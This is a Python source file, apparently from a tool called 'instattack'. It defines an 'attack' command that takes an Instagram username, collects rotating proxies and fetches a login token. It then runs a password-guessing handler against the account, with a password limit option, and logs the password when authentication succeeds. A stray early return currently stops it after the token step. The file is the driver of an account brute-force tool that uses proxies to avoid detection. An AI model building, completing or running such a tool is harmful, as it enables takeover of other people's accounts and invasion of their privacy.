import sys
import traceback

import asyncio
from plumbum import cli

from instattack.exceptions import AppException
from instattack.models import User

from instattack.lib.logger import log_handling
from instattack.lib.utils import cancel_remaining_tasks

from instattack.proxies.handlers import ProxyHandler
from instattack.instagram.handlers import TokenHandler, ResultsHandler, PasswordHandler

from .base import BaseApplication, Instattack, RequestArgs
from .proxies import ProxyArgs


@Instattack.subcommand('attack')
class InstattackAttack(BaseApplication, RequestArgs, ProxyArgs):

    __group__ = 'Instattack Attack'

    _token_max_fetch_time = cli.SwitchAttr(
        "--token_max_fetch_time", float,
        default=10.0,
        group=__group__,
    )

    _pwlimit = cli.SwitchAttr(
        "--pwlimit", int,
        default=None,
        group=__group__,
    )

    def get_handlers(self):
        config = self.request_config(method='GET')
        config['token_max_fetch_time'] = self._token_max_fetch_time

        proxy_handler = ProxyHandler(method='GET', **self.proxy_config(method='GET'))
        token_handler = TokenHandler(proxy_handler, **config)
        return proxy_handler, token_handler

    def post_handlers(self, user):
        proxy_handler = ProxyHandler(method='POST', **self.proxy_config(method='POST'))
        password_handler = PasswordHandler(self.user, proxy_handler,
            **self.request_config(method='POST'))
        return proxy_handler, password_handler

    @log_handling('self')
    def main(self, username):
        self.user = User(username)
        self.user.setup()

        loop = asyncio.get_event_loop()
        try:
            self.attack(loop)

        # This would likely be exceptions from the proxybroker package since
        # our other exceptions are handled in main().
        except Exception as e:
            exc_info = sys.exc_info()
            e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
            self.log.handle_global_exception(e)

        finally:
            loop.run_until_complete(self.shutdown(loop))
            loop.close()

    def attack(self, loop):
        get_proxy_handler, token_handler = self.get_handlers()

        try:
            # It is way faster to prepopulate the proxy pool before we
            # kickstart the consumers of those proxies and the handler itself.
            # loop.run_until_complete(get_proxy_handler.prepare(loop))
            lock = asyncio.Lock()
            task_results = loop.run_until_complete(asyncio.gather(
                token_handler.run(loop, lock),
                get_proxy_handler.run(loop, lock, prepopulate=True),
            ))

        except Exception as e:
            # This is where the loop.exception_handler() might be helpful.
            exc_info = sys.exc_info()
            e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
            self.log.handle_global_exception(e)

            # Do we really want to save proxies?
            get_proxy_handler.save_proxies(overwrite=False)
            loop.run_until_complete(get_proxy_handler.stop(loop))

        else:
            # Do we really want to save proxies?
            get_proxy_handler.save_proxies(overwrite=False)
            loop.run_until_complete(get_proxy_handler.stop(loop))

            token = task_results[0]
            if not token:
                raise AppException("Token should not be null.")
            self.log.notice('Received Token', extra={'token': token})
            return
            auth_result_found = asyncio.Event()
            results = asyncio.Queue()

            post_proxy_handler, password_handler = self.post_handlers(self.user)
            results_handler = ResultsHandler(self.user, results)

            try:
                task_results = loop.run_until_complete(asyncio.gather(
                    results_handler.run(loop, auth_result_found),
                    password_handler.run(loop, auth_result_found, token, results,
                        password_limit=self._pwlimit),
                    post_proxy_handler.run(loop, save=False, prepopulate=True),
                ))

            except Exception as e:
                # This is where the loop.exception_handler() might be helpful.
                exc_info = sys.exc_info()
                e = traceback.TracebackException(exc_info[0], exc_info[1], exc_info[2])
                self.log.handle_global_exception(e)

                loop.run_until_complete(post_proxy_handler.ensure_shutdown(loop))

            else:
                # Post Proxy Server Stopped Automatically
                result = task_results[0]
                if result:
                    self.log.notice(f'Authenticated User!', extra={
                        'password': result.context.password
                    })

            finally:
                loop.run_until_complete(results_handler.stop(loop, save=True))

    # def ensure_servers_shutdown(self, loop, *handlers):
    #     """
    #     We have to run handler.server.stop() and handler.server.find()
    #     directly from loop.run_until_complete() instead of using the
    #     async methods start_server() and stop_server() - don't know why
    #     but that is why we cannot restrict to handler._server_running.
    #     """
    #     for handler in handlers:
    #         if not handler._stopped:
    #             self.log.warning(f'{handler.method} Proxy Server Never Stopped.')
    #             loop.run_until_complete(handler.stop())

    async def shutdown(self, loop, signal=None):

        if signal:
            self.log.warning(f'Received exit signal {signal.name}...')

        with self.log.start_and_done('Shutting Down'):
            with self.log.start_and_done('Cancelling Tasks'):
                await cancel_remaining_tasks()

            loop.stop()
